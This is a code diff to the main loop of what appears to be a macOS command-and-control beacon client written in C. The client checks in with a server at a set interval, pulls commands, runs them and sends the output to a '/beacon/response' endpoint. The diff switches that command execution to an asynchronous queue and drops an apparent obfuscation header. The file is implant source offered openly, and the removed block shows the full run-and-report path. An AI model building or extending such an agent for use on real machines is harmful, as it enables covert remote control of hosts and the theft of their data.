@@ -1,22 +1,21 @@
-#include "client.h"
+#include "../include/client.h"
 #include <CFNetwork/CFNetwork.h>
 #include <CoreFoundation/CoreFoundation.h>
-#include <runtime/darwin.h>
-#include <runtime/foundation.h>
-#include <runtime/kit.h>
-#include <runtime/messaging.h>
-#include <runtime/obf.h>
-#include <runtime/xspring.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "commands.h"
-#include "network.h"
-#include "protocol.h"
-#include "sysinfo.h"
+#include "../include/command_queue.h"
+#include "../include/commands.h"
+#include "../include/commands/async_commands.h"
+#include "../include/network.h"
+#include "../include/protocol.h"
+#include "../include/runtime/darwin.h"
+#include "../include/sysinfo.h"
 
+// Only define DEBUG_LOG if it's not already defined
+#ifndef DEBUG_LOG
 #ifdef DEBUG
 #include <stdarg.h>
 static inline void debug_log(const char* fmt, ...) {
@@ -30,6 +29,7 @@ static inline void debug_log(const char* fmt, ...) {
 #define DEBUG_LOG(...) debug_log(__VA_ARGS__)
 #else
 #define DEBUG_LOG(...) ((void)0)
+#endif
 #endif
 
 // Global state
@@ -221,41 +221,12 @@ static bool check_for_commands(ClientContext* ctx) {
 
   if (command && command_id[0]) {  // If we have both command and ID
     DEBUG_LOG("Found command: %s (ID: %s)", command, command_id);
-    command_handler_t handler = get_command_handler(command);
-    if (handler) {
-      DEBUG_LOG("Found handler for command: %s", command);
-      char* result = handler(&ctx->darwin);
-      if (result) {
-        DEBUG_LOG("Command execution result: %s", result);
 
-        // Create response using our protocol
-        ProtocolBuilder* builder =
-            protocol_create_command_response(command_id, result);
-        if (builder) {
-          // Send response back to server
-          char response_url[256];
-          snprintf(response_url, sizeof(response_url), "/beacon/response/%s/%s",
-                   ctx->config.client_id, command_id);
-
-          http_request_t resp_req = {
-              .url_path = response_url,
-              .body = protocol_get_message(builder),
-              .body_length = protocol_get_length(builder)};
-
-          http_response_t resp_resp = {0};
-          if (send_http_request(ctx, &resp_req, &resp_resp) ==
-              NETWORK_SUCCESS) {
-            DEBUG_LOG("Command response sent successfully");
-          } else {
-            DEBUG_LOG("Failed to send command response");
-          }
-
-          protocol_builder_destroy(builder);
-          free_http_response(&resp_resp);
-        }
-        free(result);
-      }
+    // UPDATED: Execute command asynchronously
+    if (!execute_command_async(ctx, command_id, command)) {
+      DEBUG_LOG("Failed to execute command asynchronously");
     }
+
     free(command);
   }
 
@@ -267,6 +238,7 @@ int main(int argc, char* argv[]) {
 
   ClientContext ctx = {0};
 
+  // Initialize the Darwin API
   if (!InitializeDarwinApi(&ctx.darwin)) {
     printf("Failed to initialize Darwin API\n");
     return 1;
@@ -287,6 +259,14 @@ int main(int argc, char* argv[]) {
   }
   DEBUG_LOG("Command system initialized successfully");
 
+  // Initialize async command system
+  if (!initialize_async_commands()) {
+    DEBUG_LOG("Failed to initialize async command system");
+    fprintf(stderr, "Failed to initialize async command system\n");
+    return 1;
+  }
+  DEBUG_LOG("Async command system initialized successfully");
+
   const char* config_path = (argc > 1) ? argv[1] : "client.conf";
   DEBUG_LOG("Using config path: %s", config_path);
 
@@ -294,6 +274,14 @@ int main(int argc, char* argv[]) {
     DEBUG_LOG("Configuration loaded from file");
   } else {
     DEBUG_LOG("Using default configuration");
+  }
+
+  // Create command queue
+  ctx.command_queue = create_command_queue();
+  if (!ctx.command_queue) {
+    DEBUG_LOG("Failed to create command queue");
+    fprintf(stderr, "Failed to create command queue\n");
+    return 1;
   }
 
   printf("Client started (ID: %s)\n", ctx.config.client_id);
@@ -317,12 +305,23 @@ int main(int argc, char* argv[]) {
       printf("Failed to connect to server, retrying in %d seconds\n",
              ctx.config.ping_interval);
     } else {
+      // Check for new commands
       check_for_commands(&ctx);
+
+      // Process completed commands
+      process_completed_commands(&ctx);
     }
     sleep(ctx.config.ping_interval);
   }
 
   DEBUG_LOG("Shutting down client");
+
+  // Stop any running commands
+  stop_all_commands(&ctx);
+
+  // Destroy command queue
+  destroy_command_queue(ctx.command_queue);
+
   rtk_context_destroy(ctx.rtk);
   DEBUG_LOG("Cleanup complete");
   return 0;
